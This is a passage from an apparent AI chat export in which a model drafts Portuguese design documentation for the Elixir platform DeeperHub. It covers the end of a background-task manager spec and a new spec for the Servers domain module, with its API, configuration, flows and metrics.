    *   Após um usuário se registrar, `DeeperHub.Accounts` enfileira uma tarefa: `BackgroundTaskManager.enqueue_task(DeeperHub.Notifications.Workers.EmailWorker, :send_welcome_email, [user_id])`.
    *   O `EmailWorker` executa assincronamente, constrói e envia o email.
*   **Processamento de Upload de Vídeo:**
    *   Usuário faz upload de um vídeo. O controller API salva o arquivo e enfileira uma tarefa: `BackgroundTaskManager.enqueue_task(MyApp.VideoProcessingWorker, :process_video, [video_id, %{target_formats: [\"mp4\", \"webm\"]}])`.
    *   O `VideoProcessingWorker` realiza a transcodificação demorada em background.
*   **Limpeza Diária de Dados:**
    *   Uma tarefa recorrente é agendada: `BackgroundTaskManager.schedule_recurring_task(MyApp.DataCleanupWorker, :cleanup_old_records, [], \"0 3 * * *\")` (às 3 da manhã todos os dias).
*   **Sincronização com API Externa:**
    *   `BackgroundTaskManager.enqueue_task(MyApp.ExternalSyncWorker, :sync_product_data, [product_id], opts_with_retry)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Enfileiramento e Execução de Tarefa (Exemplo com Oban-like)

1.  **Módulo Chamador:** Chama `DeeperHub.Core.BackgroundTaskManager.enqueue_task(MyApp.MyWorker, :perform, [arg1, arg2], opts)`.
2.  **`Core.BackgroundTaskManager` (Fachada):** Delega para o `BackgroundTasksAdapter`.
3.  **`BackgroundTasksAdapter` (ex: `ObanAdapter`):**
    *   Cria um novo job Oban (ou o formato do backend) com os argumentos serializados, nome do worker, opções de fila, retentativas, etc.
    *   Insere o job no banco de dados (PostgreSQL, no caso do Oban).
    *   Retorna `{:ok, task_id}` (ID do job Oban).
4.  **Backend de Enfileiramento (Oban):**
    *   Workers Oban (processos separados) monitoram o banco de dados por novos jobs em suas filas.
    *   Um worker disponível pega o job.
    *   Desserializa os argumentos.
    *   Chama a função `perform/1` (ou `perform/2` com o job) do `MyApp.MyWorker` com os argumentos.
5.  **`MyApp.MyWorker`:**
    *   Executa a lógica da tarefa.
    *   **Sucesso:** Retorna `{:ok, result}` ou `:ok`. O backend marca o job como `completed`.
    *   **Falha (Exceção):** O backend captura a exceção, marca o job como `retryable` (ou `discarded` se exceder retentativas), registra o erro, e agenda uma retentativa conforme a política.
    *   **Falha (Retorno `{:error, reason}`):** Similar à exceção.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Core.BackgroundTaskManager`)

*(Baseado na documentação original, consolidando e clarificando)*

### 6.1. `DeeperHub.Core.BackgroundTaskManager.enqueue_task(worker_module :: module(), function_atom :: atom(), args :: list(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Enfileira uma tarefa para execução assíncrona o mais rápido possível.
*   **`worker_module`:** O módulo do worker que contém a função a ser executada.
*   **`function_atom`:** O nome da função a ser executada no worker (ex: `:perform`).
*   **`args`:** Lista de argumentos a serem passados para a função do worker. Devem ser serializáveis.
*   **`opts`:**
    *   `:queue` (String.t | atom): Nome da fila para enfileirar a tarefa. (Padrão: fila default do backend)
    *   `:priority` (integer): Prioridade da tarefa (se suportado pelo backend).
    *   `:max_attempts` (integer): Número máximo de tentativas. (Padrão: config global)
    *   `:retry_delay_seconds` (integer): Atraso base para retentativas.
    *   `:timeout_seconds` (integer): Timeout de execução da tarefa.
    *   `:unique_for_seconds` (integer | nil): Se definido, garante que apenas uma tarefa com a mesma combinação worker/função/args seja enfileirada dentro deste período.
*   **Retorno:** `{:ok, task_id}` (ID único da tarefa/job) ou `{:error, reason}`.

### 6.2. `DeeperHub.Core.BackgroundTaskManager.schedule_task(worker_module :: module(), function_atom :: atom(), args :: list(), scheduled_at :: DateTime.t() | non_neg_integer(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Agenda uma tarefa para ser executada em um momento específico no futuro ou após um atraso.
*   **`scheduled_at`:** Um `DateTime.t()` para agendamento absoluto, ou um `non_neg_integer()` para segundos de atraso a partir de agora.
*   *(Outros parâmetros e `opts` similares a `enqueue_task/4`)*

### 6.3. `DeeperHub.Core.BackgroundTaskManager.schedule_recurring_task(task_name_id :: String.t(), worker_module :: module(), function_atom :: atom(), args :: list(), cron_expression :: String.t(), opts :: keyword()) :: {:ok, String.t()} | {:error, term()}`

*   **Descrição:** Agenda uma tarefa para execução recorrente usando uma expressão CRON.
*   **`task_name_id`:** Um ID único para identificar esta tarefa recorrente (para atualizações/cancelamento).
*   **`cron_expression`:** Ex: `\"0 * * * *\"` (a cada hora).
*   *(Outros parâmetros e `opts` similares a `enqueue_task/4`, mais opções de timezone, etc.)*

### 6.4. `DeeperHub.Core.BackgroundTaskManager.cancel_task(task_id :: String.t(), opts :: keyword()) :: :ok | {:error, :not_found | term()}`

*   **Descrição:** Tenta cancelar uma tarefa pendente ou agendada. Não garante o cancelamento se a tarefa já estiver em execução.
*   **`opts`:** `:reason` (String.t).

### 6.5. `DeeperHub.Core.BackgroundTaskManager.cancel_recurring_task(task_name_id :: String.t(), opts :: keyword()) :: :ok | {:error, :not_found | term()}`

*   **Descrição:** Cancela/desabilita uma tarefa recorrente.

### 6.6. `DeeperHub.Core.BackgroundTaskManager.get_task_status(task_id :: String.t(), opts :: keyword()) :: {:ok, TaskStatus.t()} | {:error, :not_found | term()}`

*   **Descrição:** Obtém o status atual de uma tarefa.
*   **`TaskStatus.t()`:** `%{id: String.t(), status: :pending | :running | :completed | :failed | :retryable | :discarded, queue: String.t, worker: module(), attempts: integer(), last_error: String.t() | nil, inserted_at: DateTime.t(), scheduled_at: DateTime.t() | nil}`.

### 6.7. `DeeperHub.Core.BackgroundTaskManager.list_tasks(opts :: keyword()) :: {:ok, list(TaskStatus.t()), Pagination.t()} | {:error, term()}`

*   **Descrição:** Lista tarefas com filtros e paginação.
*   **`opts`:** `:status`, `:queue`, `:worker_module`, `:page`, `:per_page`, `:sort_by`.
*   **`Pagination.t()`:** `%{total_entries: integer(), total_pages: integer(), page_number: integer(), page_size: integer()}`.

### 6.8. `DeeperHub.Core.BackgroundTaskManager.get_statistics(opts :: keyword()) :: {:ok, map()}`

*   **Descrição:** Retorna estatísticas sobre as filas e workers.
*   **Exemplo de Retorno:** `%{queues: %{\"default\" => %{pending: 100, running: 5, failed_today: 2}, ...}, workers_summary: %{total_busy: 5, total_idle: 15}}`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :background_tasks, :enabled]`** (Boolean): Habilita/desabilita o sistema. (Padrão: `true`)
*   **`[:core, :background_tasks, :adapter]`** (Module): Módulo adaptador a ser usado (ex: `DeeperHub.BackgroundTasks.Adapters.ObanAdapter`). (Obrigatório se enabled)
*   **`[:core, :background_tasks, :default_queue_name]`** (String): Nome da fila padrão. (Padrão: `\"default\"`)
*   **`[:core, :background_tasks, :default_max_attempts]`** (Integer): Número máximo de tentativas padrão para tarefas. (Padrão: `5`)
*   **`[:core, :background_tasks, :default_retry_delay_seconds]`** (Integer): Atraso base para retentativas.
*   **`[:core, :background_tasks, :cleanup_worker, :retention_days_completed]`** (Integer): Retenção para jobs concluídos.
*   **`[:core, :background_tasks, :cleanup_worker, :retention_days_failed]`** (Integer): Retenção para jobs que falharam permanentemente.
*   **Configurações específicas do adaptador (prefixadas):**
    *   Ex: `[:core, :background_tasks, :oban_adapter, :repo]` (Módulo Ecto.Repo para Oban).
    *   Ex: `[:core, :background_tasks, :oban_adapter, :queues]` (Configuração de filas Oban).
    *   Ex: `[:core, :background_tasks, :exq_adapter, :redis_url]`.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logging.
*   `DeeperHub.Core.Metrics`: Para métricas.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar o adaptador e workers.
*   `DeeperHub.BackgroundTasks.Integrations.*`: Para auditoria, eventos, etc.

### 8.2. Bibliotecas Externas

*   A biblioteca de enfileiramento escolhida (ex: `Oban`, `Exq`).
*   `Jason` (ou similar) para serialização de argumentos de tarefas, se o backend exigir.

## 🤝 9. Como Usar / Integração

**Enfileirando uma Tarefa Simples:**
```elixir
defmodule MyApp.EmailService do
  alias DeeperHub.Core.BackgroundTaskManager

  def send_welcome_email_async(user_id) do
    BackgroundTaskManager.enqueue_task(
      MyApp.Workers.EmailSenderWorker, 
      :send_welcome, 
      [user_id],
      queue: \"emails\" # Opcional, usar fila específica
    )
  end
end

defmodule MyApp.Workers.EmailSenderWorker do
  # Se usando Oban: use Oban.Worker
  # Se usando um sistema simples, pode ser um módulo com uma função `perform`
  
  def perform(user_id) do # ou perform(%Oban.Job{args: %{\"user_id\" => user_id}})
    # ... lógica para buscar usuário e enviar email ...
    :ok
  end
end
```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o enfileiramento de tarefas e verificar se são processadas (usando um backend de teste ou mocks).
*   Testar a lógica de retentativa com workers que falham.
*   Testar o agendamento de tarefas futuras e recorrentes.
*   Testar o cancelamento de tarefas.
*   Testar a consulta de status e listagem de tarefas.
*   Localização: `test/deeper_hub/core/background_task_manager/` e `test/deeper_hub/background_tasks/`.

### 10.2. Métricas (via `BackgroundTasks.Integrations.MetricsIntegration`)

*   `deeper_hub.background_tasks.jobs.enqueued.count` (tags: `queue`, `worker_module`)
*   `deeper_hub.background_tasks.jobs.processed.count` (tags: `queue`, `worker_module`, `status` (`completed`, `failed`, `discarded`))
*   `deeper_hub.background_tasks.jobs.execution_time_ms` (Histograma, tags: `queue`, `worker_module`)
*   `deeper_hub.background_tasks.jobs.wait_time_ms` (Histograma, tags: `queue`, `worker_module`): Tempo na fila.
*   `deeper_hub.background_tasks.queue.size.gauge` (Gauge, tags: `queue_name`): Número de jobs pendentes.
*   `deeper_hub.background_tasks.workers.active.gauge` (Gauge, tags: `queue_name`): Número de workers ativos processando.
*   `deeper_hub.background_tasks.workers.available.gauge` (Gauge, tags: `queue_name`): Número de workers ociosos.

### 10.3. Logs

*   **Nível INFO:** Tarefa enfileirada, tarefa iniciada, tarefa concluída com sucesso. Execução de cleanup.
*   **Nível WARNING:** Tarefa falhou e será retentada. Fila atingindo alta capacidade.
*   **Nível ERROR:** Tarefa falhou após todas as tentativas e foi descartada (DLQ). Erro crítico no sistema de background tasks.

### 10.4. Telemetria (via biblioteca de backend ou `BackgroundTasks.Telemetry`)

As bibliotecas como Oban já emitem muitos eventos Telemetry. Se for uma implementação customizada, definir eventos como:
*   `[:deeper_hub, :background_tasks, :job, :enqueue]`
*   `[:deeper_hub, :background_tasks, :job, :start]`
*   `[:deeper_hub, :background_tasks, :job, :stop]` (com status de sucesso/falha)
*   `[:deeper_hub, :background_tasks, :job, :retry]`

## ❌ 11. Tratamento de Erros

*   **Falha no Worker:** O backend de enfileiramento deve capturar exceções nos workers, registrar o erro e aplicar a política de retentativa.
*   **Backend Indisponível:** Se o backend (ex: DB para Oban, Redis para Exq) estiver indisponível, o enfileiramento de novas tarefas falhará. A aplicação deve lidar com isso (ex: logar o erro e talvez tentar mais tarde, ou informar o usuário se a ação for crítica).
*   **Serialização de Argumentos:** Erros ao serializar/desserializar argumentos de tarefas devem ser tratados, geralmente resultando em falha da tarefa.

## 🛡️ 12. Considerações de Segurança

*   **Dados Sensíveis em Argumentos:** Evite passar dados altamente sensíveis como argumentos de tarefas, se possível. Se necessário, os dados devem ser criptografados ou referenciados por ID para serem buscados pelo worker de forma segura.
*   **Workers com Acesso Controlado:** Workers que realizam operações privilegiadas devem ser projetados com segurança em mente, validando seus argumentos e interagindo com outros serviços de forma segura.
*   **Segurança do Backend de Fila:** Proteger o acesso ao backend de fila (DB, Redis) é crucial.

## 🧑‍💻 13. Contribuição

*   Ao criar novos workers, certifique-se de que eles sejam idempotentes.
*   Defina configurações de fila, prioridade e retentativa apropriadas para cada tipo de tarefa.
*   Adicione logging e métricas relevantes dentro dos seus workers.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar uma UI administrativa para visualizar filas, gerenciar tarefas (cancelar, reenfileirar, ver detalhes de erro) e estatísticas. (Muitas bibliotecas como Oban já oferecem isso).
*   [ ] Adicionar suporte para \"workflows\" ou \"sagas\" onde múltiplas tarefas dependem umas das outras.
*   [ ] Permitir o cancelamento de tarefas que já estão em execução (se o worker suportar interrupção graciosa).
*   [ ] Melhorar o balanceamento de carga entre múltiplas instâncias da aplicação para processamento de tarefas.
*   [ ] Adicionar \"throttling\" de tarefas para evitar sobrecarregar APIs externas ou recursos internos.

---

*Última atualização: 2025-05-12*

---

Este módulo é um burro de carga para a aplicação, permitindo muita flexibilidade e resiliência.

O que gostaria de documentar a seguir? Talvez `DeeperHub.Shared.Utils` para cobrir os utilitários gerais, ou podemos começar com um módulo de domínio como `DeeperHub.Servers`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok! Vamos para `DeeperHub.Servers`. Este será o nosso primeiro módulo de domínio \"principal\" a ser detalhado, e ele provavelmente usará muitos dos módulos Core e Security que já documentamos.

---

# Módulo: `DeeperHub.Servers` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Servers`

O módulo `DeeperHub.Servers` é o contexto de domínio central responsável por gerenciar todas as entidades \"Servidor\" dentro da plataforma DeeperHub. Isso inclui a criação, configuração, listagem, atualização e exclusão de servidores, bem como o gerenciamento de seus metadados associados, como status, tags, pacotes de assinatura, eventos, alertas, avaliações (reviews) e mensagens de atualização.

Este módulo serve como a principal interface para que usuários (proprietários de servidores e jogadores) e outros sistemas interajam com os dados e funcionalidades dos servidores listados na plataforma. 😊

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Gerenciamento CRUD de Servidores (`create_server/1`, `get_server/1`, `update_server/2`, `delete_server/1`):**
    *   Criação de novos registros de servidor com informações básicas (nome, descrição, endereço, porta, proprietário).
    *   Busca de servidores por ID, nome, ou outros critérios.
    *   Atualização de informações do servidor.
    *   Exclusão (lógica ou física) de servidores.
*   **Listagem e Descoberta de Servidores (`list_servers/1`):**
    *   Fornecer funcionalidades de listagem com filtros (por tags, região, status, tipo de jogo, etc.) e ordenação.
    *   Suporte à paginação para grandes listas de servidores.
*   **Gerenciamento de Status do Servidor:**
    *   Rastrear e atualizar o status de um servidor (online, offline, manutenção).
    *   (Opcional) Integrar com um sistema de monitoramento para obter status em tempo real.
*   **Gerenciamento de Tags de Servidor (`add_server_tag/2`, `remove_server_tag/2`, `list_server_tags/1`):**
    *   Permitir que proprietários de servidores associem tags aos seus servidores para categorização e descoberta.
    *   (Delegação para `DeeperHub.Services.ServerTags`).
*   **Gerenciamento de Pacotes de Servidor (Assinaturas/VIPs) (`DeeperHub.Services.ServerPackages`):**
    *   Permitir que proprietários criem e gerenciem pacotes (ex: VIP, itens) que podem ser oferecidos aos jogadores.
*   **Gerenciamento de Eventos de Servidor (`DeeperHub.Services.ServerEvents`):**
    *   Permitir que proprietários criem e gerenciem eventos para seus servidores (ex: evento de XP em dobro, torneio).
*   **Gerenciamento de Alertas de Servidor (`DeeperHub.Services.ServerAlerts`):**
    *   Permitir que proprietários enviem alertas ou anúncios para os jogadores do seu servidor ou para a comunidade.
*   **Gerenciamento de Avaliações (Reviews) de Servidor (`DeeperHub.Services.ServerReviews`):**
    *   Permitir que jogadores avaliem e escrevam reviews sobre os servidores.
    *   Calcular a avaliação média de um servidor.
*   **Gerenciamento de Mensagens de Atualização (`DeeperHub.Services.ServerUpdateMessages`):**
    *   Permitir que proprietários postem mensagens de atualização sobre seus servidores (ex: notas de patch, novidades).
*   **Gerenciamento de Convites de Servidor (`create_server_invite/1`, `list_server_invites/2`):**
    *   Permitir a criação e gerenciamento de códigos de convite para servidores privados ou para rastrear referências.
*   **Reputação do Servidor (`DeeperHub.Services.Lists.Schema.Reputation`):**
    *   (Potencial) Manter e calcular uma pontuação de reputação para servidores com base em avaliações, tempo online, moderação, etc.
*   **Integração com Autenticação e Autorização:**
    *   Garantir que apenas o proprietário de um servidor (ou administradores com permissão) possa modificar suas configurações.
    *   Usar `DeeperHub.Auth` e `DeeperHub.RBAC`.
*   **Observabilidade:**
    *   Registrar logs e métricas para operações de servidor.
    *   Publicar eventos de domínio (servidor criado, atualizado, etc.) no `Core.EventBus`.
*   **Limitação de Taxa (Rate Limiting):**
    *   Aplicar rate limiting para operações de criação ou atualização frequentes (via `DeeperHub.Services.Servers.RateLimitIntegration`).

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Servers` (Fachada Pública):**
    *   Ponto de entrada para todas as operações relacionadas a servidores.
    *   Delega para o `ServersService` (ou `DefaultServersService`).
2.  **`DeeperHub.Servers.Services.DefaultServersService` (ou `ServersService`):**
    *   **Responsabilidade:** Orquestra a lógica de negócio para o domínio de Servidores.
    *   **Interações:**
        *   `DeeperHub.Core.Repo`: Para todas as operações CRUD com o `ServerSchema` e schemas associados (se não delegados).
        *   `DeeperHub.Services.ServerTags.ServerTagsAdapter` (ou sua fachada): Para gerenciamento de tags.
        *   `DeeperHub.Services.ServerPackages.ServerPackagesAdapter`: Para pacotes.
        *   `DeeperHub.Services.ServerEvents.ServerEventsAdapter`: Para eventos.
        *   `DeeperHub.Services.ServerAlerts.ServerAlertsAdapter`: Para alertas.
        *   `DeeperHub.Services.ServerReviews.ServerReviewsAdapter`: Para reviews.
        *   `DeeperHub.Services.ServerUpdateMessages.ServerUpdateMessagesAdapter`: Para mensagens de atualização.
        *   `DeeperHub.Auth`: Para verificações de autorização (ex: quem é o proprietário).
        *   `DeeperHub.Core.EventBus`: Para publicar eventos como `server_created`.
        *   `DeeperHub.Core.Cache`: Para cachear dados de servidores frequentemente acessados.
3.  **Schemas Ecto:**
    *   **`DeeperHub.Servers.Schema.Server`:** Entidade principal do servidor.
    *   `DeeperHub.Services.ServerTags.Schema.Tag` (ou `DeeperHub.Servers.Schema.Tag` se movido para cá).
    *   `DeeperHub.Services.ServerPackages.Schema.ServerPackage`
    *   `DeeperHub.Services.ServerEvents.Schema.Event`
    *   `DeeperHub.Services.ServerAlerts.Schema.Alert`
    *   `DeeperHub.Services.ServerReviews.Schema.Review`
    *   `DeeperHub.Services.ServerUpdateMessages.Schema.UpdateMessage`
    *   `DeeperHub.Servers.Schema.Invite`
    *   `DeeperHub.Services.Lists.Schema.Reputation` (ou `DeeperHub.Servers.Schema.Reputation`)
4.  **`DeeperHub.Servers.Storage` (ou lógica dentro do `DefaultServersService`):**
    *   Encapsula as consultas Ecto diretas para o `ServerSchema` e, potencialmente, para os schemas associados mais simples, se os submódulos (`ServerTags`, etc.) forem apenas lógicos e não tiverem seu próprio storage.
5.  **Workers (Opcional):**
    *   `ServerStatusMonitorWorker`: Para verificar periodicamente o status online dos servidores.
    *   `ServerReputationCalculatorWorker`: Para recalcular a reputação dos servidores.
6.  **`DeeperHub.Servers.RateLimitIntegration`:**
    *   Aplica rate limiting para operações específicas do módulo Servers.
7.  **`DeeperHub.Servers.CachedAdapter` (Opcional):**
    *   Se for decidido adicionar uma camada de cache explícita para os dados do servidor além do `Core.Cache` genérico. (A documentação original sugere isso para `ServerPackages`, `ServerEvents`, etc., o que é uma boa prática).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/servers/
├── servers.ex                        # Fachada Pública
│
├── services/
│   └── default_servers_service.ex    # Serviço principal do domínio Servers
│   # Outros serviços auxiliares específicos de Servers, se necessário
│
├── schemas/                          # (Ou schema/ singular)
│   ├── server.ex
│   └── invite.ex
│   └── reputation.ex                 # Se a reputação for fortemente ligada ao servidor
│
├── workers/                          # Opcional
│   ├── server_status_monitor_worker.ex
│   └── server_reputation_calculator_worker.ex
│
├── rate_limit_integration.ex
├── supervisor.ex
└── telemetry.ex                      # Ou um Metrics.ex dedicado
```
**Submódulos de \"Serviços\" da documentação original seriam seus próprios contextos de domínio:**
```
lib/deeper_hub/server_tags/
lib/deeper_hub/server_packages/
lib/deeper_hub/server_events/
lib/deeper_hub/server_alerts/
lib/deeper_hub/server_reviews/
lib/deeper_hub/server_update_messages/
```
Cada um com sua própria estrutura (fachada, serviço, schemas, storage/adapter, supervisor, telemetry). O `DeeperHub.Servers` então interagiria com as fachadas desses módulos.

### 3.3. Decisões de Design Importantes

*   **Domínio Rico vs. Anêmico:** O `ServerSchema` e o `DefaultServersService` devem conter lógica de negócio relevante para um servidor.
*   **Delegação para Subdomínios:** Funcionalidades como Tags, Pacotes, Eventos, Reviews, etc., são complexas o suficiente para serem seus próprios contextos/módulos de domínio, com os quais `DeeperHub.Servers` interage. Isso mantém o módulo `Servers` focado na entidade principal.
*   **Propriedade e Autorização:** A lógica de quem pode fazer o quê com um servidor (proprietário, administradores, jogadores) é fundamental e deve ser integrada com `DeeperHub.Auth` e `DeeperHub.RBAC`.
*   **Caching Estratégico:** Dados de servidores frequentemente visualizados (listagens, detalhes de servidores populares) devem ser cacheados. A invalidação do cache deve ocorrer quando os dados do servidor ou de seus sub-recursos (reviews, tags) mudam.

## 🛠️ 4. Casos de Uso Principais

*   **Proprietário Cria um Novo Servidor:**
    *   Usuário autenticado (proprietário) preenche um formulário.
    *   A API chama `DeeperHub.Servers.create_server(user_id, server_attrs)`.
    *   O serviço valida os dados, verifica permissões, e persiste o novo servidor.
    *   Um evento `server_created` é publicado.
*   **Jogador Procura Servidores de \"RPG PvP\":**
    *   A API recebe uma requisição para `GET /api/v1/servers?tags=rpg,pvp`.
    *   Chama `DeeperHub.Servers.list_servers(%{tags: [\"rpg\", \"pvp\"], include_stats: true})`.
    *   O serviço consulta servidores, possivelmente buscando tags no módulo `ServerTags`, e retorna a lista.
*   **Jogador Avalia um Servidor:**
    *   A API chama `DeeperHub.ServerReviews.create_review(user_id, server_id, review_attrs)`.
    *   O `ServerReviews` valida e salva a review.
    *   Pode disparar um evento que o `DeeperHub.Servers` escuta para recalcular a média de avaliação do servidor e invalidar o cache.
*   **Sistema Monitora Status de um Servidor:**
    *   `ServerStatusMonitorWorker` periodicamente tenta se conectar ao `server.address` e `server.port`.
    *   Atualiza o `server.status` e `server.last_seen_online_at` via `DeeperHub.Servers.update_server_status(server_id, new_status_info)`.

## 🌊 5. Fluxos Importantes

### Fluxo de Criação de Servidor

1.  **Requisição API/UI:** Usuário submete dados para criar um servidor.
2.  **Controller API:** Valida a autenticação do usuário. Chama `DeeperHub.Servers.create_server(current_user.id, params)`.
3.  **`DeeperHub.Servers` (Fachada):** Delega para `DefaultServersService.create_server/2`.
4.  **`DefaultServersService.create_server/2`:**
    *   Verifica se o usuário tem permissão para criar servidores (ex: `DeeperHub.RBAC.has_permission?(user_id, :server, :create)`).
    *   Cria um changeset para `DeeperHub.Servers.Schema.Server` com os `params` e `owner_id: current_user.id`.
    *   Se o changeset for válido:
        *   Chama `DeeperHub.Core.Repo.insert(changeset)`.
        *   Se a inserção for bem-sucedida:
            *   Publica um evento `server_created` via `Core.EventBus` com os dados do novo servidor.
            *   Registra no `DeeperHub.Audit`.
            *   Retorna `{:ok, server_struct}`.
        *   Se a inserção falhar, retorna `{:error, db_error_reason}`.
    *   Se o changeset for inválido, retorna `{:error, changeset}`.

### Fluxo de Listagem de Servidores com Filtro por Tag

1.  **Requisição API/UI:** `GET /servers?tags=pvp,economy`
2.  **Controller API:** Chama `DeeperHub.Servers.list_servers(%{tags: [\"pvp\", \"economy\"], page: 1, per_page: 20})`.
3.  **`DeeperHub.Servers` (Fachada):** Delega para `DefaultServersService.list_servers/1`.
4.  **`DefaultServersService.list_servers/1`:**
    *   **Cache Check (Opcional):** Tenta buscar do `Core.Cache` usando uma chave baseada nos filtros. Se hit, retorna.
    *   **Consulta ao `ServerTags`:** Chama `DeeperHub.ServerTags.list_servers_by_tags([\"pvp\", \"economy\"])` para obter uma lista de `server_ids`.
    *   **Construção da Query Ecto:**
        ```elixir
        query = from(s in Server, where: s.id in ^server_ids_from_tags)
        # Aplicar outros filtros (status, nome, etc.)
        # Aplicar ordenação e paginação
        ```
    *   Executa a query via `Core.Repo.all(query)`.
    *   (Opcional) Para cada servidor, busca informações adicionais como avaliação média (`ServerReviews.get_average_rating(server.id)`).
    *   **Cache Put (Opcional):** Armazena o resultado no `Core.Cache`.
    *   Retorna `{:ok, %{servers: results, pagination_details: ...}}`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Servers`)

*(Baseado na documentação original e consolidando com as responsabilidades dos submódulos que seriam delegados)*

### 6.1. `DeeperHub.Servers.create_server(owner_id :: String.t(), attrs :: map()) :: {:ok, Server.t()} | {:error, Ecto.Changeset.t() | term()}`

*   **Descrição:** Cria um novo servidor.
*   **`attrs`:** Mapa com dados do servidor (ex: `:name`, `:description`, `:address`, `:port`, `:game_type`, `:banner_url`, etc.).

### 6.2. `DeeperHub.Servers.get_server(server_id :: String.t(), opts :: keyword()) :: {:ok, Server.t() | nil} | {:error, term()}`

*   **Descrição:** Obtém um servidor pelo seu ID.
*   **`opts`:**
    *   `:preload` (list): Associações Ecto a serem pré-carregadas (ex: `[:tags, :reviews, :active_events]`).
    *   `:include_stats` (boolean): Se deve incluir estatísticas agregadas como avaliação média, contagem de jogadores (pode envolver chamadas a outros serviços).
*   **Retorno:** `{:ok, server}` ou `{:ok, nil}` se não encontrado (ou `{:error, :not_found}`).

### 6.3. `DeeperHub.Servers.list_servers(filters :: map(), opts :: keyword()) :: {:ok, list(Server.t()), Pagination.t()} | {:error, term()}`

*   **Descrição:** Lista servidores com base em filtros, ordenação e paginação.
*   **`filters`:** Mapa com filtros (ex: `%{name_contains: \"craft\", tags: [\"survival\"], min_rating: 4.0, status: :online, owner_id: \"user123\"}`).
*   **`opts`:** `:sort_by`, `:sort_order`, `:page`, `:per_page`, `:preload`, `:include_stats`.

### 6.4. `DeeperHub.Servers.update_server(server_id :: String.t(), attrs :: map(), current_user_id :: String.t()) :: {:ok, Server.t()} | {:error, Ecto.Changeset.t() | :unauthorized | term()}`

*   **Descrição:** Atualiza um servidor existente. Requer que `current_user_id` seja o proprietário ou tenha permissão de admin.

### 6.5. `DeeperHub.Servers.delete_server(server_id :: String.t(), current_user_id :: String.t()) :: {:ok, Server.t()} | {:error, :unauthorized | :not_found | term()}`

*   **Descrição:** Exclui um servidor.

### 6.6. Funções Delegadas para Submódulos (Exemplos):

*   `DeeperHub.Servers.add_tag_to_server(server_id, tag_name, current_user_id)` -> Delega para `DeeperHub.ServerTags`.
*   `DeeperHub.Servers.list_server_reviews(server_id, filters, opts)` -> Delega para `DeeperHub.ServerReviews`.
*   `DeeperHub.Servers.create_server_package(server_id, package_attrs, current_user_id)` -> Delega para `DeeperHub.ServerPackages`.
*   ... e assim por diante para `ServerEvents`, `ServerAlerts`, `ServerUpdateMessages`, `ServerInvites`.

### 6.7. `DeeperHub.Servers.update_server_status(server_id :: String.t(), status_info :: map()) :: {:ok, Server.t()} | {:error, term()}` (Nova Sugestão)

*   **Descrição:** Atualiza o status de um servidor (online, offline, player_count). Usado por um worker de monitoramento.
*   **`status_info`:** `%{status: :online | :offline, player_count: integer(), max_players: integer(), version: String.t()}`.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:servers, :max_servers_per_user]`** (Integer): Limite de servidores que um usuário pode criar. (Padrão: `5`)
*   **`[:servers, :default_list_page_size]`** (Integer): Tamanho padrão da página para listagens. (Padrão: `20`)
*   **`[:servers, :cache, :server_details_ttl_seconds]`** (Integer): TTL para cache de detalhes de servidor. (Padrão: `300`)
*   **`[:servers, :cache, :server_list_ttl_seconds]`** (Integer): TTL para cache de listagens de servidor. (Padrão: `60`)
*   **`[:servers, :status_monitor, :enabled]`** (Boolean): Habilita o worker de monitoramento de status. (Padrão: `true`)
*   **`[:servers, :status_monitor, :check_interval_seconds]`** (Integer): Intervalo para verificar status dos servidores. (Padrão: `300`)
*   **`[:servers, :reputation, :recalculation_interval_hours]`** (Integer): Intervalo para recalcular reputação.
*   *(Configurações específicas para tags, reviews, pacotes, etc., residiriam em seus respectivos módulos)*

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.Repo`: Para persistência.
*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Cache`.
*   `DeeperHub.Auth` e `DeeperHub.RBAC`: Para autorização de proprietários e administradores.
*   `DeeperHub.Accounts`: Para associar servidores a proprietários.
*   **Submódulos de Serviço:** `DeeperHub.ServerTags`, `ServerPackages`, `ServerEvents`, `ServerAlerts`, `ServerReviews`, `ServerUpdateMessages`.
*   `DeeperHub.Servers.RateLimitIntegration`.

### 8.2. Bibliotecas Externas

*   `Ecto`.
*   Bibliotecas para query de status de servidores de jogos específicos (ex: Minecraft RCON, Source Query), se o `ServerStatusMonitorWorker` for implementado.

## 🤝 9. Como Usar / Integração

*   **APIs Web/Mobile:** Controllers da API chamarão as funções da fachada `DeeperHub.Servers` para realizar operações.
*   **Painel de Proprietário do Servidor:** Uma UI web para proprietários gerenciarem seus servidores usaria esses endpoints.
*   **Sistema de Busca:** O `DeeperHub.Services.Search` usaria `DeeperHub.Servers.list_servers/2` com vários filtros.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar todas as operações CRUD para servidores.
*   Testar a lógica de listagem com diferentes filtros e ordenações.
*   Testar as interações com os submódulos (tags, reviews, etc.) usando mocks ou testes de integração.
*   Testar a lógica de autorização (proprietário vs. outros usuários).
*   Testar o funcionamento dos workers (monitor de status, cálculo de reputação).
*   Localização: `test/deeper_hub/servers/`.

### 10.2. Métricas

*   `deeper_hub.servers.created.count`
*   `deeper_hub.servers.updated.count`
*   `deeper_hub.servers.deleted.count`
*   `deeper_hub.servers.listed.count` (tags: `filter_count`)
